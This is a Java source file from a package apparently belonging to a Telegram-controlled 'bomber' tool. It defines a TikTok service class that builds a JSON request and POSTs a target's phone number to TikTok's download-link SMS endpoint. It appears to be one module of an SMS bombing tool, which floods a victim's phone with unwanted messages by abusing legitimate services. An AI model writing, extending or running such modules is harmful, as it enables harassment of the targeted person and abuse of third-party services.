package com.example.webapp.telegram.bomber.services;

import com.example.webapp.telegram.bomber.services.utils.JsonService;
import org.json.JSONException;
import org.json.JSONObject;

public class TikTok extends JsonService {

    public TikTok() {
        setUrl("https://m.tiktok.com/node-a/send/download_link");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();
        JSONObject page = new JSONObject();

        try {
            page.put("pageName", "home");
            page.put("launchMode", "direct");
            page.put("trafficType", "");

            json.put("slideVerify", "0");
            json.put("language", "ru");
            json.put("PhoneRegionCode", countryCode);
            json.put("Mobile", phone);
            json.put("page", page);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
